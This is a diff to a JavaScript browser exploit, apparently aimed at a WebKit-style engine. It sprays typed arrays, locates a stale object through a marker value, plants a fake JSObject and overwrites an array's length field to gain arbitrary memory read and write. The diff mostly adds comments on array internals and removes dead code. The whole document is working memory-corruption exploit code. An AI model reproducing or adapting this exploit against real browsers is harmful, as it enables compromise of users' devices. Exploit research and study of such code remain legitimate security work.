@@ -14,8 +14,7 @@ var smsh = new Uint32Array(0x10)
 function keep(x) {
 	setTimeout(function() { alert("shit" + x) }, 10*60*1000);
 }
-//var fakeobj = {};
-//var fop = 0;
+
 
 var mem0 = 0;
 var mem1 = 0;
@@ -104,12 +103,6 @@ function smashed(stl) {
 	return 0;
 }
 
-if(document != document){
-	for(var i = 0; i < 5; i++){var x=0;}
-	var faadp = {};
-	var faf21 = 0;
-	var xtas = [];
-}
 
 
 function go_() {
@@ -175,9 +168,11 @@ function go_() {
 	for(i = 0; i < bufs.length; i++) {
 		for(k = 0; k < bufs[0].length; k++) {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
+			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
 				// Create fakeobj for fixing butterfly ptr
-				//stale[0] = fakeobj;
+
+ 				
 
 				stale[0] = {
 					'a': u2d(105, 0x1172600), // the JSObject properties
@@ -188,8 +183,34 @@ function go_() {
 			
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
+				
+				/*
+				Array internals:
+					void* JSCell
+					void* m_vector;
+					void* butterflyptr
+					uint32_t m_length;
+					TypedArrayMode m_mode;
+					
+					stale[0][0] == first32(JSCell)
+					stale[0][1] == second32(JSCell)
+					stale[0][2] == first32(m_Vector)
+					stale[0][3] == second32(m_Vector)
+					stale[0][4] == first32(butterflyptr)
+					stale[0][5] == second32(butterflyptr)
+					stale[0][6] == m_length
+				*/
 
+				
+				//alert("Accesing stale[0]");
+				//var x = stale[0];
+				//alert("Accesing stale[0]");
+				
+				//alert("Orginal smsh len:" + smsh.length);
 				stale[0][6] = 0xffffffff; // Overide m_length field
+				//alert("New smsh len:" + smsh.length);
+				
+				// Adding new code here
 				bck = stale[0][4];
 				stale[0][4] = 0; // address, low 32 bits
 				mem0 = stale[0];
@@ -228,13 +249,6 @@ function go() {
 	dgc();
 	dgc();
 	dgc();
-	if(document != document){
-		for(var i = 0; i < 5; i++){var x=0;}
-		var faadp = {};
-		var faf21 = 0;
-		var xtas = [];
-	}
-
 	setTimeout(go_, 400);
 }
 go();
